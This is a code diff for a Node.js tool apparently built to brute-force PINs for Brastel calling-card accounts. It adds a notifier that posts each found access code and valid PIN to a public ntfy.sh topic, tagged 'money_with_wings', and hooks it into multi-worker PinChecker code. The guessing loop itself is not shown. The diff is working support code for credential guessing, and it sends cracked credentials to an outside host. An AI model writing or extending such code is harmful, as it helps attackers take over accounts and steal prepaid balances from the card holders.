@@ -130,6 +130,97 @@ const CONFIG = {
 };
 
 /**
+ * NTFY Notification class for sending success notifications
+ */
+class NtfyNotifier {
+  constructor() {
+    this.ntfyServer = process.env.NTFY_SERVER || 'https://ntfy.sh';
+    this.ntfyTopic = process.env.NTFY_TOPIC || 'dhloc';
+    this.ntfyTitle = process.env.NTFY_TITLE || 'Brastel PIN Checker';
+  }
+
+  /**
+   * Send notification when PIN is found
+   * @param {string} accessCode - Access code
+   * @param {string} pin - Found PIN
+   * @param {string} serverId - Server ID (optional)
+   */
+  async sendPinFoundNotification(accessCode, pin, serverId = null) {
+    try {
+      if (!this.ntfyTopic) {
+        console.log('⚠️  NTFY topic not configured, skipping notification');
+        return;
+      }
+
+      const serverInfo = serverId ? ` (Server ${serverId})` : '';
+      const title = `${this.ntfyTitle}${serverInfo}`;
+      const message = `🎯 FOUND VALID PIN!\n\nAccess Code: ${accessCode}\nPIN: ${pin}\nTime: ${new Date().toISOString()}`;
+
+      const url = `${this.ntfyServer}/${this.ntfyTopic}`;
+
+      const response = await axios.post(url, message, {
+        headers: {
+          'Title': title,
+          'Priority': 'high',
+          'Tags': 'tada,money_with_wings'
+        },
+        timeout: 10000
+      });
+
+      console.log(`📲 NTFY notification sent successfully: ${title}`);
+      return response.data;
+
+    } catch (error) {
+      console.error('❌ Failed to send NTFY notification:', error.message);
+      // Don't throw error - notification failure shouldn't stop PIN checking
+    }
+  }
+
+  /**
+   * Send process completion notification
+   * @param {string} processName - Process name
+   * @param {string} accessCode - Access code
+   * @param {string|null} foundPin - Found PIN or null
+   * @param {string} serverId - Server ID (optional)
+   */
+  async sendProcessCompleteNotification(processName, accessCode, foundPin = null, serverId = null) {
+    try {
+      if (!this.ntfyTopic) {
+        return;
+      }
+
+      const serverInfo = serverId ? ` (Server ${serverId})` : '';
+      const title = `${this.ntfyTitle}${serverInfo}`;
+
+      let message, tags;
+      if (foundPin) {
+        message = `✅ Process "${processName}" COMPLETED with SUCCESS!\n\nAccess Code: ${accessCode}\nFound PIN: ${foundPin}\nTime: ${new Date().toISOString()}`;
+        tags = 'white_check_mark,tada';
+      } else {
+        message = `📝 Process "${processName}" completed\n\nAccess Code: ${accessCode}\nResult: No PIN found\nTime: ${new Date().toISOString()}`;
+        tags = 'memo';
+      }
+
+      const url = `${this.ntfyServer}/${this.ntfyTopic}`;
+
+      await axios.post(url, message, {
+        headers: {
+          'Title': title,
+          'Priority': foundPin ? 'high' : 'default',
+          'Tags': tags
+        },
+        timeout: 10000
+      });
+
+      console.log(`📲 Process notification sent: ${processName}${foundPin ? ' (SUCCESS)' : ''}`);
+
+    } catch (error) {
+      console.error('❌ Failed to send process notification:', error.message);
+    }
+  }
+}
+
+/**
  * Utility functions
  */
 class Utils {
@@ -573,6 +664,7 @@ class PinChecker {
     this.found = false;
     this.undefinedCount = 0; // Per-worker undefined counter
     this.shouldStopWorker = false; // Per-worker stop flag
+    this.ntfyNotifier = new NtfyNotifier(); // Add NTFY notifier
   }
 
   /**
@@ -636,6 +728,11 @@ class PinChecker {
       this.logger.found(`Worker ${workerId} - FOUND VALID PIN: ${pin}`);
       this.fileManager.addValidPin(pin);
       this.found = true;
+
+      // Send NTFY notification
+      this.ntfyNotifier.sendPinFoundNotification(this.accessCode, pin, process.env.SERVER_ID)
+        .catch(error => this.logger.error(`NTFY notification failed: ${error.message}`));
+
       return true;
     }
 
@@ -1167,5 +1264,6 @@ module.exports = {
   CONFIG,
   Utils,
   LOG_LEVELS,
-  API_RESULT_CODES
+  API_RESULT_CODES,
+  NtfyNotifier
 };
